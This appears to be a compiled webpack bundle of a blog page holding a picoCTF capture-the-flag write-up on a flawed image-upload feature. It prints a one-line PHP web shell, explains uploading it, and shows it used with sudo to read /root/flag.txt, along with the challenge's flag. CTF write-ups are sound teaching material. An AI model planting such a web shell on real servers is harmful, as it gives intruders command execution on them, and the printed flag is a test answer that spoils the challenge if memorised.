"use strict";(self.webpackChunkmy_own_blog=self.webpackChunkmy_own_blog||[]).push([[7416],{2567:(e,t,n)=>{n.d(t,{A:()=>i});const i=n.p+"assets/images/flag-cc4614e22b14afa48996565a0ee25e7f.png"},3785:(e,t,n)=>{n.d(t,{A:()=>i});const i=n.p+"assets/images/sudo-l-f08f23911e8dda4720dc22c8cdd9dd30.png"},6830:(e,t,n)=>{n.d(t,{A:()=>i});const i=n.p+"assets/images/upload-b1873f669526a6e6d49dd4b9a5e07091.png"},8132:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>a,contentTitle:()=>d,default:()=>h,frontMatter:()=>l,metadata:()=>i,toc:()=>c});const i=JSON.parse('{"id":"pico-ctf/web-exploitation/n0s4n1ty-1/n0s4n1ty-1","title":"n0s4n1ty 1","description":"- Description: A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.","source":"@site/docs/pico-ctf/web-exploitation/n0s4n1ty-1/n0s4n1ty-1.mdx","sourceDirName":"pico-ctf/web-exploitation/n0s4n1ty-1","slug":"/pico-ctf/web-exploitation/n0s4n1ty-1/","permalink":"/my-small-blog/docs/pico-ctf/web-exploitation/n0s4n1ty-1/","draft":false,"unlisted":false,"tags":[{"inline":false,"label":"Web","permalink":"/my-small-blog/docs/tags/web","description":"Web tag description"}],"version":"current","frontMatter":{"tags":["web"]},"sidebar":"tutorialSidebar","previous":{"title":"logon","permalink":"/my-small-blog/docs/pico-ctf/web-exploitation/logon/"},"next":{"title":"Scavenger Hunt","permalink":"/my-small-blog/docs/pico-ctf/web-exploitation/scavenger-hunt"}}');var o=n(4848),s=n(8453);const l={tags:["web"]},d="n0s4n1ty 1",a={},c=[{value:"\ud83d\udd0e Solution",id:"-solution",level:2},{value:"\ud83d\udea9Flag",id:"flag",level:2}];function r(e){const t={blockquote:"blockquote",br:"br",code:"code",h1:"h1",h2:"h2",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,s.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(t.header,{children:(0,o.jsx)(t.h1,{id:"n0s4n1ty-1",children:"n0s4n1ty 1"})}),"\n",(0,o.jsxs)(t.ul,{children:["\n",(0,o.jsxs)(t.li,{children:[(0,o.jsx)(t.strong,{children:"Description:"})," A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory."]}),"\n",(0,o.jsxs)(t.li,{children:[(0,o.jsx)(t.strong,{children:"Difficulty:"})," Easy"]}),"\n"]}),"\n",(0,o.jsx)(t.hr,{}),"\n",(0,o.jsx)(t.h2,{id:"-solution",children:"\ud83d\udd0e Solution"}),"\n",(0,o.jsx)(t.p,{children:"The provided web application allows users to upload an image file."}),"\n",(0,o.jsx)("div",{style:{width:"100%",margin:"0 auto"},children:(0,o.jsx)("img",{src:n(6830).A,style:{width:"100%",height:"auto"}})}),"\n",(0,o.jsxs)(t.p,{children:["For example, when uploading ",(0,o.jsx)(t.code,{children:"red.png"}),", the application confirms the upload with a message like ",(0,o.jsx)(t.strong,{children:'"The file red.png has been uploaded Path: uploads/red.png"'}),",\r\nnavigating to ",(0,o.jsx)(t.code,{children:"uploads/red.png"})," successfully displays the image.",(0,o.jsx)(t.br,{}),"\n","But is it strictly limited to image files?\r\nTo test the server's validation, I prepared a simple PHP web shell with the following content:"]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-php",children:"<?php echo shell_exec($_GET['cmd']); ?>\n"})}),"\n",(0,o.jsxs)(t.p,{children:["I then uploaded this file as ",(0,o.jsx)(t.code,{children:"img.php"})," via the same upload interface. After the upload, I accessed it through ",(0,o.jsx)(t.code,{children:"uploads/img.php?cmd=<command>"})]}),"\n",(0,o.jsxs)(t.ul,{children:["\n",(0,o.jsxs)(t.li,{children:["Using ",(0,o.jsx)(t.code,{children:"?cmd=ls"})," listed all uploaded files such as ",(0,o.jsx)(t.code,{children:"img.php"})," and ",(0,o.jsx)(t.code,{children:"red.png"}),"."]}),"\n",(0,o.jsxs)(t.li,{children:["Using ",(0,o.jsx)(t.code,{children:"?cmd=pwd"})," revealed the current working directory: ",(0,o.jsx)(t.code,{children:"/var/www/html/uploads"})]}),"\n",(0,o.jsxs)(t.li,{children:["Executing ",(0,o.jsx)(t.code,{children:"?cmd=whoami"})," showed the current user: ",(0,o.jsx)(t.code,{children:"www-data"})]}),"\n"]}),"\n",(0,o.jsxs)(t.p,{children:["When executing longer commands that include spaces, I replaced spaces with ",(0,o.jsx)(t.code,{children:"+"}),". For example, ",(0,o.jsx)(t.code,{children:"sudo -l"})," becomes ",(0,o.jsx)(t.code,{children:"?cmd=sudo+-l"}),".\r\nThe output indicated that ",(0,o.jsx)(t.code,{children:"www-data"})," can execute commands as ",(0,o.jsx)(t.code,{children:"root"})," without a password."]}),"\n",(0,o.jsx)("div",{style:{width:"100%",margin:"0 auto"},children:(0,o.jsx)("img",{src:n(3785).A,style:{width:"100%",height:"auto"}})}),"\n",(0,o.jsxs)(t.p,{children:["I ran ",(0,o.jsx)(t.code,{children:"?cmd=sudo+ls+/root"})," and found ",(0,o.jsx)(t.code,{children:"flag.txt"}),".\r\nFinally, I retrieved the flag with the payload:"]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{children:"uploads/img.php?cmd=sudo+cat+/root/flag.txt\n"})}),"\n",(0,o.jsx)(t.p,{children:"Here is the final output:"}),"\n",(0,o.jsx)("div",{style:{width:"70%",margin:"0 auto"},children:(0,o.jsx)("img",{src:n(2567).A,style:{width:"100%",height:"auto"}})}),"\n",(0,o.jsx)(t.h2,{id:"flag",children:"\ud83d\udea9Flag"}),"\n",(0,o.jsxs)(t.blockquote,{children:["\n",(0,o.jsx)(t.p,{children:(0,o.jsx)(t.code,{children:"picoCTF{wh47_c4n_u_d0_wPHP_712a9451}"})}),"\n"]})]})}function h(e={}){const{wrapper:t}={...(0,s.R)(),...e.components};return t?(0,o.jsx)(t,{...e,children:(0,o.jsx)(r,{...e})}):r(e)}},8453:(e,t,n)=>{n.d(t,{R:()=>l,x:()=>d});var i=n(6540);const o={},s=i.createContext(o);function l(e){const t=i.useContext(s);return i.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function d(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:l(e.components),i.createElement(s.Provider,{value:t},e.children)}}}]);